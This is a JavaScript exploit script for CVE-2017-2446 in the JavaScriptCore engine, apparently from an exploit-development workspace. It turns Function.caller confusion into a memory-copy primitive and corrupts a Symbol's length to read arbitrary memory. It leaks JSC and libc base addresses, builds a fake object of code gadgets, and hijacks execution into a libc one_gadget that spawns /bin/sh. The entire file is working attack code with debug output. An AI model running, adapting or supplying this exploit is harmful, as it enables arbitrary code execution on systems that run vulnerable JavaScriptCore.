if (typeof mdprint == 'undefined') {
    print('prepare print function..');
    mdprint = print;
}

if (typeof console == 'undefined') {
    mdprint('load utils.js and int64.js');
    load("/root/exp-dev/cve-2017-2446/utils.js");
    load("/root/exp-dev/cve-2017-2446/int64.js");
}

mdprint('setting up take_rip...');
var inf = new Intl.NumberFormat();
var take_rip;
function f(){
    take_rip = f.caller;
    return 10;
}
inf.format({valueOf : f});
// take_rip.call({a: new Int64('0x4141414142424242')});

function makeMemcpy() {
    var p;
    function g(){
        p = g.caller;
        return 7;
    }
    
    var a = [1, 2, 3];
    Object.defineProperty(a, "0", {get : g});
    a.concat([4]);
    return p;
}

var brutedMemcpy = makeMemcpy();
let leaked_obj = Symbol.for("AAAAAAAA");
let u8_array = new Uint8Array(0xAB);
let busted_len_value = new Int64('0000ffff' + '00000002').asDouble(); // //length: ffff, refcount: 2
let normal_len_value = new Int64('00000008' + '00000002').asDouble(); // //length: 8, refcount: 2
let busted_array = [busted_len_value];
let start_index = 0;

mdprint('[+] symbol:\n' + describe(leaked_obj));
mdprint('[+] u8_array:\n' + describe(u8_array));

// dbg();

mdprint("trigger vulnerability!");
brutedMemcpy(leaked_obj, busted_array, start_index);

mdprint("leak info...");
let leaked_content = leaked_obj.toString(); // index=7 is start position of 'AAAAAAAA'
//for (let i = 0; i < 40; i++) {
//    let leakedByte = leaked_content.charCodeAt(i);
//    mdprint(leakedByte.toString(16));
//}

function readBytesRel(size, outUint8Array) {
    if (size == undefined) size = 8;
    if (outUint8Array == undefined) outUint8Array = new Uint8Array(size);
    for (let i = 0; i < size; i++) {
        outUint8Array[i] = leaked_content.charCodeAt(7 + i);
        mdprint('LeakedObjContent[' + i + '] = ' + outUint8Array[i]);
    }
    return outUint8Array;
}

function leakStringBase() {
    let u8Array = readBytesRel(28);
    mdprint('u8Array: ' + u8Array);
    let leak = readBytesRel(28).slice(-8);
    mdprint('addrArray: ' + leak);
    return Sub(new Int64(leak), new Int64('0x20'));
}

mdprint('leaking string addr...');
let leaked_str = leakStringBase();
mdprint('string @ ' + leaked_str);


function readBytes(target, sz, out) {
    if (sz  == undefined) sz = 8;
    if (out == undefined) out = new Uint8Array(sz);

    let target_dbl;
    switch (typeof target) {
        case 'string':
            target_dbl = new Int64(target).asDouble();
            break;
        case 'object':
            target_dbl = target.asDouble();
            break;
        default:
            throw 'unknown target type';
    }

    let x = Symbol('xxxxxxxxx');

    // we need to do this, because otherwise sometimes the array shape doesnt
    // end up as continuous doubles
    let y = [];
    y.push(busted_len_value);
    y.push(target_dbl);
    brutedMemcpy(x, y, 0);
    let s = x.toString();
    // strlen('Symbol(') == 7
    try {
        for (let i = 0; i < sz; i++) {
            let z = s.charCodeAt(7 + i);
            if (z > 0xff) throw 'char out of range';
            out[i] = z;
        }
    } catch (e) {
        let out_idx = 0;
        for (let i = 0; out_idx < sz; i++) {
            let z = s.charCodeAt(7 + i);
            out[out_idx++] = z & 0xff;
            out[out_idx++] = (z >> 8) & 0xff;
        }
    }

    brutedMemcpy(x, [normal_len_value], 0);
    return out;
}

function convertBuffer2Hex(buffer) { // buffer is an ArrayBuffer
  return 'HEX: ' + Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join('');
}

mdprint('leak jsc base addr...');
mdprint('type of leaked_str: ' + typeof(leaked_str));
var leaked_ss = leaked_str.toString();
var leaked_str_aligned_addr =  new Int64(leaked_ss.substr(0, leaked_ss.length-3)+'000');
var leaked_jsc_addr = new Int64(readBytes(leaked_str_aligned_addr));
mdprint('leaked JSC address: ' + leaked_jsc_addr);
var leaked_jsc_data_addr = Sub(leaked_jsc_addr, new Int64('0xfea8'));
mdprint('leaked JSC data section: ' + leaked_jsc_data_addr);
mdprint(convertBuffer2Hex(readBytes(leaked_jsc_data_addr, 0x50)));
var leaked_jsc_text_addr = Sub(leaked_jsc_data_addr, new Int64('0xc83000'));
mdprint('leaked JSC text section: ' + leaked_jsc_text_addr);
mdprint(convertBuffer2Hex(readBytes(leaked_jsc_text_addr, 0x50)));
var leaked_libc_text_addr = Sub(leaked_jsc_text_addr, new Int64('0x969000'));
mdprint('leaked libc text section: ' + leaked_libc_text_addr);
mdprint(convertBuffer2Hex(readBytes(leaked_libc_text_addr, 0x50)));


let known_loc = [];
for (let i = 0; i < 0xf8; i += 8) known_loc.push(new Int64('0x5151515151515151').asDouble());
mdprint('known_loc:\n' + describe(known_loc));

// @ [rax+0x0]
// write signature code
var sig_shellcode = new Int64('0xd0d0b1b1d2d2b3b3');
known_loc[0] = sig_shellcode.asDouble();

// @ [rax+0x48]
//  360b60:    45 31 c0                 xor    r8d,r8d
//  360b63:    48 89 ea                 mov    rdx,rbp
//  360b66:    48 89 de                 mov    rsi,rbx
//  360b69:    ff 90 f8 00 00 00        call   QWORD PTR [rax+0xf8]
let zero_r8 = Add(leaked_jsc_text_addr, new Int64('0x360b60'));
mdprint('zero r8, address: ' + zero_r8);
mdprint(convertBuffer2Hex(readBytes(zero_r8, 0x20)));
known_loc[0x48/8] = zero_r8.asDouble();

// @ [rax+0xf8]
// 5da891:    4c 89 44 24 28           mov    QWORD PTR [rsp+0x28],r8
// 5da896:    f2 0f 11 4c 24 20        movsd  QWORD PTR [rsp+0x20],xmm1
// 5da89c:    f2 0f 11 54 24 18        movsd  QWORD PTR [rsp+0x18],xmm2
// 5da8a2:    48 8b 74 24 10           mov    rsi,QWORD PTR [rsp+0x10]
// 5da8a7:    ff 50 10                 call   QWORD PTR [rax+0x10]
let make_rsp_constant = Add(leaked_jsc_text_addr, new Int64('0x5da891'));
mdprint('write stack constant, address: ' + make_rsp_constant);
mdprint(convertBuffer2Hex(readBytes(Sub(make_rsp_constant,new Int64('0x01')), 0x20)));
known_loc[0xf8/8] = make_rsp_constant.asDouble();

// @ [rax+0x10]
// 0x4526a    execve("/bin/sh", rsp+0x30, environ)
// constraints:
//   [rsp+0x30] == NULL
let call_one_gadget = Add(leaked_libc_text_addr, new Int64('0x4526a'));
mdprint('call one gadget, address: ' + call_one_gadget);
mdprint(convertBuffer2Hex(readBytes(Sub(call_one_gadget, new Int64('0x02')), 0x20)));
known_loc[0x10/8] = call_one_gadget.asDouble();

// search shellcode address
let array_butterfly_addr = new Int64('0x00007fffb2ba85f8');
mdprint('hardcoded address of shellcode: ' + array_butterfly_addr);

var leaked_sc_heap_addr = new Int64(readBytes(Sub(leaked_str, new Int64('0xbc4')))); // 0xca4
mdprint('leaked_sc_heap_addr: ' + leaked_sc_heap_addr);
var leaked_sc_heap_addr2 = new Int64(readBytes(Sub(leaked_str, new Int64('0xba4'))));
mdprint('leaked_sc_heap_addr2: ' + leaked_sc_heap_addr2);

if (leaked_sc_heap_addr > leaked_sc_heap_addr2) {
    mdprint('use leaked_sc_heap_addr');
} else {
    mdprint('use leaked_sc_heap_addr2');
    leaked_sc_heap_addr = leaked_sc_heap_addr2;
}

function searchShellcodeSigByString() {
    for (let i = 0; i <= 0x10000/0x8; i+=8) {
        let addr = Add(leaked_sc_heap_addr, i);
        let data = new Int64(readBytes(addr)); 
        mdprint('search signature --> addr: ' + addr + ', data: ' + data);
        if (data.toString() == sig_shellcode.toString()) {
            return addr; 
        }
    }
    throw 'cannot find shellcode signature!';
}

function findOffsetByBytes(data, signature) {
    function findOffset(data, signature) {
        for (let i = 0; i < data.length - signature.length; i++) {
            let found = true;
            for (let j = 0; j < signature.length && found; j++) {
                if (data[i + j] != signature[j]) found = false;
            }
            if (found) return i;
        }
        throw 'findOffset() could not find: ' + signature;
    }
    return '0x' + findOffset(data, signature).toString(16);
}

function searchShellcodeSigByBytes(base, data, signature) {
    return Add(base, new Int64(findOffsetByBytes(data, signature)));
}

mdprint('read content from leaked_sc_heap_addr...');
let sc_memory_area = readBytes(leaked_sc_heap_addr, 0xffff);
mdprint('match signature byte by byte...');
var shellcode_addr = searchShellcodeSigByBytes(leaked_sc_heap_addr, sc_memory_area, sig_shellcode.bytes());
mdprint('shellcode content:\n' + convertBuffer2Hex(readBytes(shellcode_addr, 0x50)));

// trigger shellcode
mdprint('shellcode address: ' + shellcode_addr);
var bytes = shellcode_addr.bytes();
mdprint(bytes);
reversed_bytes = bytes.reverse();
mdprint(reversed_bytes);
var faked_rax = new Int64(reversed_bytes);
mdprint(faked_rax);
//dbg();

//take_rip.call({a: faked_rax.toString()}); 
take_rip.call({a: new Int64('0xf885bab2ff7f0000')});
//dbg();
mdprint('[+] Done!');

